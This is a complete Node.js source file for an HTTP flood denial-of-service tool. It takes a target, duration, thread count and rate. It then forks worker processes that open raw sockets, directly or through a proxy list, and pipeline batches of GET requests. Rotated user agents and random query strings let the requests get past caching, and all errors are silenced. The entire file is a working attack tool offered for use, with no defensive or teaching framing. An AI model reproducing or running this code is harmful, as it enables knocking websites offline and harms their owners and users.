/**
 * HTTP-FLOOD (Layer 7) — Raw Socket Pipelined Flooder
 * ONLY works for http:// targets (No TLS/HTTPS overhead)
 */

'use strict';

const net = require('net');
const fs = require('fs');
const cluster = require('cluster');
const crypto = require('crypto');

// Suppress errors to keep the process alive
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const args = process.argv.slice(2);
// Expected args: <target> <duration> <threads> <rate> [proxyfile]
if (args.length < 4) {
    console.log('Usage: node http-flood.js <target> <duration> <threads> <rate> [proxyfile]');
    process.exit(1);
}

const target = args[0];
if (!target.startsWith('http://')) {
    console.error('❌ Error: This method strictly requires an http:// target.');
    process.exit(1);
}

const duration = parseInt(args[1], 10);
const threads = parseInt(args[2], 10);
const rate = parseInt(args[3], 10);
const proxyFile = args[4] || 'proxy.txt';

const url = new URL(target);
const host = url.hostname;
const port = url.port || 80;
const path = url.pathname + url.search;

let proxies = [];
try {
    proxies = fs.readFileSync(proxyFile, 'utf8').split('\n').map(l => l.trim()).filter(p => p.length > 0);
} catch (e) {}

const UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
];

// Generate random path to bypass caching (e.g., /?r=a1b2c3)
const randomPath = () => {
    return path + (path.includes('?') ? '&' : '?') + crypto.randomBytes(6).toString('hex');
};

// Direct HTTP payload (Keep-Alive, Pipelined)
const buildDirect = () => {
    const ua = UAS[Math.floor(Math.random() * UAS.length)];
    return Buffer.from(
        `GET ${randomPath()} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `User-Agent: ${ua}\r\n` +
        `Accept: */*\r\n` +
        `Connection: keep-alive\r\n\r\n`
    );
};

// Proxy HTTP payload (Absolute URI)
const buildProxy = () => {
    const ua = UAS[Math.floor(Math.random() * UAS.length)];
    return Buffer.from(
        `GET http://${host}${randomPath()} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `User-Agent: ${ua}\r\n` +
        `Accept: */*\r\n` +
        `Connection: keep-alive\r\n\r\n`
    );
};

const attack = () => {
    if (proxies.length > 0) {
        const p = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        if (!p[0] || !p[1] || isNaN(p[1])) return;
        
        const socket = net.connect(parseInt(p[1], 10), p[0], () => {
            const batch = [];
            for (let i = 0; i < 15; i++) batch.push(buildProxy());
            socket.write(Buffer.concat(batch));
        });
        socket.on('error', () => socket.destroy());
        socket.setTimeout(4000, () => socket.destroy());
    } else {
        const socket = net.connect(port, host, () => {
            const batch = [];
            for (let i = 0; i < 10; i++) batch.push(buildDirect());
            socket.write(Buffer.concat(batch));
        });
        socket.on('error', () => socket.destroy());
        socket.setTimeout(4000, () => socket.destroy());
    }
};

if (cluster.isMaster) {
    console.log(`\n╔════════════════════════════════════════╗`);
    console.log(`║       HTTP-FLOOD (L7) — ACTIVE         ║`);
    console.log(`╚════════════════════════════════════════╝`);
    console.log(`🎯 Target : ${target}`);
    console.log(`⏱ Duration: ${duration}s`);
    console.log(`⚙️ Threads : ${threads}`);
    console.log(`⚡ Rate    : ${rate} req/s/thread`);
    console.log(`──────────────────────────────────────────`);
    
    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => { process.exit(0); }, duration * 1000);
} else {
    setInterval(() => {
        for (let i = 0; i < rate; i++) {
            attack();
        }
    }, 1000);
    setTimeout(() => process.exit(0), duration * 1000);
}